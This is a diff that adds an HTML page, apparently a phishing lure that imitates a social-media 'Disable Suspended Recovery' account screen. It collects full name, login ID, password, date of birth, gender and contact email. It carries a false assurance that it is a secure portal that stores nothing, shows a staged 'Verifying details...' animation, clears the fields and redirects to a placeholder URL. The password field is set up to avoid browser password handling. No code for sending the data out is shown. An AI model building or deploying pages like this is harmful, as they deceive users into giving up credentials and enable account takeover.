@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlk</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .contact-container {
+            width: 80%;
+            margin: 20px auto 0 auto;
+            padding: 20px;
+            background-color: transparent; /* Changed to transparent */
+            box-shadow: none; /* Removed shadow/border effect */
+            transition: margin-top 0.3s;
+            min-height: 400px;
+        }
+        .top-logo {
+            display: block;
+            margin: 0 auto 10px auto;
+            width: 70px;
+            height: auto;
+        }
+        .contact-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            margin-top: 0;
+            color: red; /* Kept Red as requested previously */
+        }
+        .form-fields {
+            display: flex;
+            flex-direction: column;
+        }
+        .contact-container label {
+            margin-bottom: 5px;
+            color: black;
+        }
+        .contact-container input,
+        .contact-container select,
+        .contact-container textarea {
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .proceed-btn {
+            padding: 10px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .proceed-btn:hover {
+            background-color: #218838;
+        }
+        .password-container {
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+        .password-container input {
+            flex: 1;
+            margin-right: 10px;
+        }
+        .toggle-icon {
+            position: absolute;
+            right: 15px;
+            top: 16%;
+            cursor: pointer;
+            font-size: 18px;
+            user-select: none;
+        }
+        .optional-text {
+            color: green;
+            opacity: 0.5;
+            font-size: 0.9em;
+            margin-left: 5px;
+            margin-top: -15px;
+        }
+        .disclaimer {
+            font-size: 0.8em;
+            color: #666;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        /* Loading Screen CSS */
+        #loadingScreen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-top: 50px;
+        }
+        .blinking-logo {
+            width: 80px;
+            height: auto;
+            animation: blinker 1s linear infinite;
+        }
+        @keyframes blinker {
+            50% { opacity: 0.3; }
+        }
+        .verifying-text {
+            margin-top: 20px;
+            font-size: 1.1em;
+            color: #555;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="contact-container">
+    <img src="inlogo.png" alt="Logo" class="top-logo" id="mainLogo">
+    
+    <h2 id="formTitle">Disable Suspended Recovery</h2>
+    
+    <div id="loadingScreen">
+        <img src="inlogo.png" alt="Loading" class="blinking-logo">
+        <div class="verifying-text">Verifying details...</div>
+    </div>
+
+    <div class="form-fields" id="fakeForm">
+        <label for="name"><strong>Full Name</strong></label>
+        <input type="text" id="name" placeholder="Enter your full name" autocomplete="off" autocorrect="off" spellcheck="false">
+
+        <label for="loginId"><strong>Login ID</strong></label>
+        <input type="text" id="loginId" placeholder="Number, username, or email" autocomplete="off" autocorrect="off" spellcheck="false">
+
+        <label for="password"><strong>Password</strong></label>
+        <div class="password-container">
+            <input type="text" id="password" placeholder="Enter your password" autocomplete="one-time-code" autocorrect="off" spellcheck="false">
+            <span class="toggle-icon" id="togglePassword"></span>
+        </div>
+
+        <label for="dob"><strong>Date of Birth</strong></label>
+        <div style="display: flex; align-items: center;">
+            <input type="date" id="dob" placeholder="Enter your Date of Birth" autocomplete="off">
+            <span class="optional-text">(Optional)</span>
+        </div>
+
+        <label for="gender"><strong>Gender</strong></label>
+        <select id="gender" autocomplete="off">
+            <option value="" disabled selected>Select your Gender</option>
+            <option value="male">Male</option>
+            <option value="female">Female</option>
+            <option value="other">Other</option>
+        </select>
+
+        <label for="contactEmail"><strong>Contact Email</strong></label>
+        <input type="text" id="contactEmail" placeholder="Enter your contact email" autocomplete="off" autocorrect="off" spellcheck="false">
+
+        <button class="proceed-btn" onclick="validateAndRedirect(event)">Proceed</button>
+        
+        <div class="disclaimer">
+            This is a secure verification portal. We do not store sensitive information.
+        </div>
+    </div>
+</div>
+
+<script>
+    function validateAndRedirect(event) {
+        event.preventDefault();
+        
+        const password = document.getElementById('password').value;
+        if (password.length < 6) {
+            alert("Please enter a valid Password.");
+            return;
+        }
+
+        document.getElementById('fakeForm').style.display = 'none';
+        document.getElementById('formTitle').style.display = 'none';
+        document.getElementById('mainLogo').style.display = 'none';
+
+        document.getElementById('loadingScreen').style.display = 'flex';
+
+        document.getElementById('fakeForm').querySelectorAll('input, select, textarea').forEach(element => {
+            element.value = '';
+        });
+
+        setTimeout(function() {
+            window.location.href = "//////";
+        }, 3000); 
+    }
+
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    togglePassword.addEventListener('click', function () {
+        const type = passwordInput.getAttribute('type') === 'text' ? 'text' : 'text';
+        passwordInput.setAttribute('type', type);
+        this.textContent = type === 'text' ? '' : '';
+    });
+</script>
+
+</body>
+</html>
